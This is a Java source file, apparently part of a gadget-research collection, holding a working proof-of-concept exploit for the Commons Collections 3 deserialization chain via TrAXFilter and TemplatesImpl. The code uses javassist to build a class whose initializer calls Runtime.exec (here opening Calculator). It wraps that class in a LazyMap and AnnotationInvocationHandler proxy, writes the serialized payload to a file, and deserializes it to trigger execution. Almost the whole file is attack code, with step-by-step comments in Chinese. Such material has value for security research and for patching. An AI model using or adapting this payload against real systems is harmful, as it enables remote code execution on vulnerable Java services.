package com.sec.exploits.CommonsCollections.CommonsCollections3;

import com.sec.annotation.Dependencies;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-15 11:32
 **/

/**
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			AnnotationInvocationHandler.readObject()
 * 				Proxy(LazyMap).extrySet()
 * 			      AnnotationInvocationHandler.invoke()
 * 					LazyMap.get()
 * 						ChainedTransformer.transform()
 * 					    ConstantTransformer.transform()
 * 					    InstantiateTransformer.transform()
 * 							(TrAXFilter)Constructor.newInstance()
 * 						       TrAXFilter#TrAXFilter()
 * 							   TemplatesImpl.newTransformer()
 * 									TemplatesImpl.getTransletInstance()
 * 								    TemplatesImpl.defineTransletClasses()
 * 										（PayLoad）newInstance()
 * 									        Runtime.exec()
 *
 */



@Dependencies({
        "commons-collections:commons-collections:3.1",
        "<=jdk7u21"
})
public class TrAXFilter_Exploit {
    public static void main(String[] args) throws Exception{
        //1.先创建恶意类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass tempExploitClass = pool.makeClass("3xpl01t");
        //一定要设置父类，为了后续顺利
        tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        //写入payload，生成字节数组
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /Applications/Calculator.app\");";
        tempExploitClass.makeClassInitializer().insertBefore(cmd);
        byte[] exploitBytes = tempExploitClass.toBytecode();



        //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件
        TemplatesImpl tmpl = new TemplatesImpl();
        //设置_bytecodes属性为exploitBytes
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{exploitBytes});
        //一定要设置_name不为空
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(tmpl, "0range");
        //_class为空
        Field _class = TemplatesImpl.class.getDeclaredField("_class");
        _class.setAccessible(true);
        _class.set(tmpl, null);


        //3.构造chain，封装进LazyMap
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{tmpl}
                )
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);
        HashMap innermap = new HashMap();
        LazyMap lazymap = (LazyMap)LazyMap.decorate(innermap,chain);

        //4. 拿到cons,先做一个h1，h1.memberValues = lazymap
        final Constructor cons = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        cons.setAccessible(true);
        InvocationHandler h1 = (InvocationHandler) cons.newInstance(Target.class,lazymap);

        // 创建LazyMap的动态代理类实例
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),h1);

        // 创建一个AnnotationInvocationHandler实例h2，并且把刚刚创建的代理赋值给h2.memberValues
        InvocationHandler h2 = (InvocationHandler)cons.newInstance(Target.class, mapProxy);


        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc3_TrAXFilter.ser")));
        fout.writeObject(h2);

        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_cc3_TrAXFilter.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();
    }
}
